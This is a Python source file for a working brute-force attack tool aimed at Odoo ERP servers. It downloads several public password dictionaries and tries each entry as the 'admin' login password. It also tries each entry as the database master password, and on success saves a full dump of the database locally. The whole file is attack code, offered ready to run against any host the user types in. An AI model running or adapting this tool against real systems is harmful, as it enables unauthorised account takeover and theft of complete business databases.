# -*- coding: utf-8 -*-
# © 2017 Jose Zambudio Bernabeu

import sys
import bz2
import urllib2
import logging
import readline

from builtins import input

import odoorpc

_logger = logging.getLogger("[BF]")
_formatter = logging.Formatter("%(asctime)-15s\t%(levelname)s\t#> %(message)s")
_fh = logging.FileHandler('brute_force_login_odoo.log')
_fc = logging.StreamHandler(sys.stdout)
_fh.setFormatter(_formatter)
_logger.addHandler(_fh)
_logger.addHandler(_fc)
_logger.setLevel(logging.DEBUG)
_logger.propagate = False

WRONG_LOGIN = 'Wrong login ID or password'
PASSWORDS_DICTIONARIES = [
    "http://downloads.skullsecurity.org/passwords/john.txt.bz2",
    "http://downloads.skullsecurity.org/passwords/cain.txt.bz2",
    "http://downloads.skullsecurity.org/passwords/conficker.txt.bz2",
    "http://downloads.skullsecurity.org/passwords/500-worst-passwords.txt.bz2",
    "http://downloads.skullsecurity.org/passwords/twitter-banned.txt.bz2",
]


class MyCompleter(object):

    def __init__(self, options):
        self.options = sorted(options)

    def complete(self, text, state):
        if state == 0:  # on first trigger, build possible matches
            if text:  # cache matches (entries that start with entered text)
                self.matches = [
                    s for s in self.options if s and s.startswith(text)
                ]
            else:  # no text entered, all matches possible
                self.matches = self.options[:]
        # return match indexed by state
        try:
            return self.matches[state]
        except IndexError:
            return None


class BruteForce(object):
    def __init__(self, host, port, timeout=3600):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.odoo = False
        self.database = False
        self.do_connect()
        self.select_database()

    def do_connect(self):
        try:
            self.odoo = odoorpc.ODOO(self.host, port=self.port, timeout=self.timeout)
        except Exception as e:
            _logger.error("Bruteforce::do_connect")
            _logger.exception(e)
            sys.exit(1)

    def select_database(self):
        try:
            databases_alloweds = self.odoo.db.list()
            completer = MyCompleter(databases_alloweds)
            readline.set_completer(completer.complete)
            readline.parse_and_bind('tab: complete')
            while not self.database:
                database_server = input("Database: ")
                if database_server in databases_alloweds:
                    self.database = database_server
        except Exception as e:
            _logger.error("Bruteforce::do_connect")
            _logger.exception(e)
            sys.exit(1)

    def attack_loggin(self, user, password, show_errors=False):
        logged = False
        try:
            self.odoo.login(self.database, user, password)
            _logger.info("ACCESS!! user: %s || password: %s" % (user, password))
            logged = True
        except odoorpc.error.RPCError as exc:
            if hasattr(exc, "args") and isinstance(exc.args, (list, tuple)) and \
                    len(exc.args) > 1 and exc.args[0] == WRONG_LOGIN and show_errors:
                _logger.error("Bruteforce::attack_loggin %s %s" % (user, password))
            pass
        except Exception as e:
            _logger.exception(e)
            pass
        return logged

    def attack_dump(self, password, show_errors=False):
        dump = False
        try:
            dump = self.odoo.db.dump(password, self.database)
            _logger.info("DUMP!! password: %s" % (password))
        except odoorpc.error.RPCError as exc:
            if hasattr(exc, "args") and isinstance(exc.args, (list, tuple)) and \
                    len(exc.args) > 1 and exc.args[0] == WRONG_LOGIN and show_errors:
                _logger.error("Bruteforce::attack_dump %s" % (password))
            pass
        except Exception as e:
            _logger.exception(e)
            pass
        if dump:
            dump_filename = self.database + ".dump"
            _logger.info("Saving dump file with name: " + dump_filename)
            with open(dump_filename, 'w') as dump_zip:
                dump_zip.write(dump.read())
        return bool(dump)

    def attack(self, users, passwords, show_errors=False):
        find = dump = False
        for user in users:
            user2 = user.strip()
            for password in passwords:
                password2 = password.strip()
                find = self.attack_loggin(user2, password2, show_errors=show_errors)
                dump = self.attack_dump(password2, show_errors=show_errors)
                if find or dump:
                    break
            if dump:
                break
        if not find:
            _logger.info("Login not found!")


if __name__ == "__main__":
    host = input("Host: ")
    port = input("Port: ")
    timeout = 3600
    bf = BruteForce(host, port, timeout=timeout)

    try:
        users = ["admin"]
        passwords = []
        for dictionary_url in PASSWORDS_DICTIONARIES:
            response = urllib2.urlopen(dictionary_url)
            dictionary_bz2 = bz2.decompress(response.read())
            dict_passwords = [
                psswd for psswd in dictionary_bz2.split("\n") if psswd not in passwords
            ]
            bf.attack(users, dict_passwords)
            passwords += dict_passwords
    except Exception as e:
        _logger.error("No se ha podido crear la lista de usuarios, passwords")
        _logger.exception(e)
        sys.exit(1)
